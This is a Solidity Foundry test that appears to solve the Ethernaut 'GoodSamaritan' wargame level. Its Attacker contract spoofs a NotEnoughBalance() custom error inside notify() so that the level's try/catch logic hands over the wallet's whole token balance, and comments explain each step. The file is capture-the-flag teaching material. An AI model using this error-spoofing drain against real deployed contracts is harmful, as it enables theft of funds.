// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest-08.sol";
import "src/levels/GoodSamaritan.sol";
import "src/levels/GoodSamaritanFactory.sol";

contract TestGoodSamaritan is BaseTest {
    GoodSamaritan private level;

    constructor() {
        // SETUP LEVEL FACTORY
        levelFactory = new GoodSamaritanFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance(true));
        level = GoodSamaritan(levelAddress);
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // To resolve this challenge we have to drain all the funds from Good Samaritan's wallet.

        // Whenever we call requestDonation() fn of Good Samaritan contract, it first calls donate10 fn of wallet contract
        // Inside, donate10 fn, it transfers 10 tokens to the requester, unless wallet contract balance is less
        // than 10 tokens, in which case it reverts with the error message "NotEnoughBalance()".

        // requestDonation() fn uses try-catch to make an external call, meaning that if the external call fails
        // for any xyz reason, catch block of requestDonation() fn would be executed.

        // Now, what catch block does is that it checks if the external call failed with revert message
        // "NotEnoughBalance()", if so it calls transferRemainder fn of wallet contract and transfers all the remaining
        // balance of the wallet contract to the requester,

        Attacker attacker = new Attacker();
        attacker.attack(level);

        vm.stopPrank();
    }
}

contract Attacker is INotifyable {
    error NotEnoughBalance();

    function notify(uint256 amount) external {
        // When donate10 fn of wallet contract is called and the token balance of the wallet contract is not
        // less than 10, it calls transfer fn of Coin contract, which calls notify fn to the requester address if
        // the requester address is a contract.

        // If we just revert in this fn then the txn will revert because notify fn would also be called by Coin contract
        // when transferRemainder() is called, so when Wallet is transferring it's entire balance our txn would still revert
        // and we won't be able to drain the funds.

        // So, what this checks does is that, when this fn is called the first time, amount param value is 10, we revert
        // with the error message which makes Good Samaritan contract to call transferRemainder fn, but this time
        // amount param would contain the entire balance of the wallet contract so we don't want to revert the txn.
        if (amount == 10) {
            revert NotEnoughBalance();
        }
    }

    function attack(GoodSamaritan _level) public {
        _level.requestDonation();
    }
}
